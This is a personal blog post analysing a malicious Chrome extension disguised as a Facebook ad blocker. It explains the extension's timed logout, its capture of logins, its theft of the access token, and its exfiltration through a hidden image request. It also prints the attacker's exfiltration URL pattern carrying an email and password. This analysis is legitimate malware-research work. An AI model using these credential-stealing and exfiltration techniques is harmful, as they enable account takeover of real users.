---
layout: post
title: Inside a malicious Chrome Extension
---
Today I saw a sketchy Facebook ad, an empty “Blogging” site with stock photos advertised an “Ad blocker for Facebook”.

I checked out the site, and saw that it only had negative reviews, stating that it didn’t work and slowed down their browser. This made me curious.

## The Extension
![Screenshot from the Chrome Web Store]({{site.url}}/public/chrome_extension_title.jpg)

The extension claims to block out Facebook advertisements, and — ironically — advertises itself on Facebook for it. This stragety is quite simple but ingenious, I mean who likes to see ads while browsing Facebook? Also if you are seeing their advertisement, you obviously have no AdBlocker installed for it.

The Chrome Web Store says it has a total of 10k+ users.

## Behind the Scenes

Analyzing Google Chrome Extensions can be quite easy, atleast when the code — like in this example — isnt obfuscated.

You can just download it, get the unique extension ID from chrome://extensions, and then look at the source code found in your Profile Folder\Extensions\IDofYourExtension.

## Basic Structure

The Extension folder has 4 subfolders, a empty .vs folder, suggesting that the developers used Visual Studio, a _metadata folder filled with file hashes, this seems to be a Chrome Extension standard to guarantee that the files haven’t been modified or corrupted, a img folder with the extension logo, and finally the interesting part: A folder named **js**.

This folder has a total of 4 non obfuscated JavaScript files, and — *as all good JavaScript programs* — a jQuery dependency.

We will focus on 2 files: **background.js** and **fb3.js**.

In background.js, a listener is added when the Chrome extension is installed, it waits 25 seconds until it executes the function **s_fun_en()**

{% gist 7e8d06bcadafce622d6d4c92872c3e72 background.js %}

The delay of 25 seconds is interesting, the extension tries to not raise suspicion with a variety of timing strageties.

The function **s_fun_en()** is full of these timing strageties. First it creates a timestamp, and saves it to the variable **n**, which will later be compared to the **app.lt** variable, while ensuring that **app.lt** is not the default value of **0**.

**app.lt** is the timestamp of installation, the function **s_fun_en()** results in nothing until 11 hours have passed since the installation.

{% gist 115b6e212affcb2945c1f7b4a5aee6eb background.js %}

This condition is true when **n** (the current timestamp) is bigger than the installation timestamp + 11 hours.

If 11 hours have passed the extension begins working: It removes 2 cookies from Facebook, resulting in deauthentication, and also marks the time when the user was kicked out of his Facebook account in the **app.ltr** variable.

This helps the extension to remain under the radar, so the user does not raise suspicion when he is logged out directly after installing this extension.

This is when we have a look at the **fb3.js** file, it listens for the moment when the user is logging into Facebook again.

The extension steals the E-Mail and password, and sends it to the message listener in **background.js**

{% gist 044fd5c39cb1f0ad46dd770ac1b8bf19 fb3.js %}

The listener saves the E-Mail and password combination into the **app.ld** variable, and proceeds to store the **c_user** cookie in **app.u**, containing the unique ID of the victims Facebook profile. If it can’t find this cookie, it executes the function again, until it gives up after a minute.

The **fb3.js** has another function, which constantly tries to grab the Facebook access token, if it succeeds it is also stored in **app.t**

{ % gist 6acf2a878e1cb69521cb2a7dfdcc6072 background.js %}

So now the extension has successfully grabbed the E-Mail and Password, the unique ID, and the access token.

The obtained information is quite critical, the E-Mail and Password could be used to access the users Facebook account, or to access other accounts in which the same combination is used.

**The extension has gathered a lot of information, the breaking point however is how it transfers this information back to the owner.**

## The Exfil

Typically, malware has a breaking point: The Exfiltration of it's stolen data, or contacting a C&C Server to receive further instructions.

While code can be obfuscated, and (most of the times) gives no clue to whoever made it, the malware has to contact some server (which can be reported, to law enforcement or easier the hosting provider) to submit it’s findings.

After all the work on the local side is done, **background.js** get’s to work again:

It checks if all the needed data is grabbed, and saves the E-Mail password combination into **d**, base64 encodes it, and then embeds a picture.

{% gist e1810d7eec2b783cef019d445bc76613 background.js %}

The picture is generated from www.en-antibanner.ru/img.php , and the extension adds a lot of parameters to it.

``https://en-antibanner.ru/img.php?d=EMailAndPassword&u=UserID&l=&rnd=RandomNumber``

This picture is 1x1 big, so you really wouldn’t see it.

Loading an image, rather than making a POST request to some sketchy server, is less likely to be detected.

## Measures taken

I reported the extension to the Chrome Web Store and Facebook, I will talk more about in a second. *Note from future Altay: Chrome took it down, and also heavily improved their extension security with [Manifest V3](https://developer.chrome.com/docs/extensions/mv3/intro/)*

I had a quite funny idea: What would happen if you would trash their database by adding tons and tons of random data. They would get the infected users credentials for sure, but they would have to search for it between all the junk data.

I wrote a quick JavaScript which creates a fake E-Mail and Password combination, a fake User ID and then sends it to the server.

You can add fake data by visiting this [JSFiddle]/https://jsfiddle.net/ozj1mhpu/) and hitting the “Run” Button, once, twice or maybe a thousand times. *Future Altay: The website is down, it was fun nonetheless*

**Thank you for reading!** I am not quite sure how to think about this, Chrome Web Store has virtually no security measures, I wasn’t warned that this file could be a virus and the extension seems to be able to do just about everything, while users can install it with one-click. *Future Altay: Manifest V3 is better I guess, although users will probably accept every single permission requested*

[You can look into the extension yourself, I uploaded it to my GitHub](https://github.com/AltayAkkus/FacebookAdBlocker)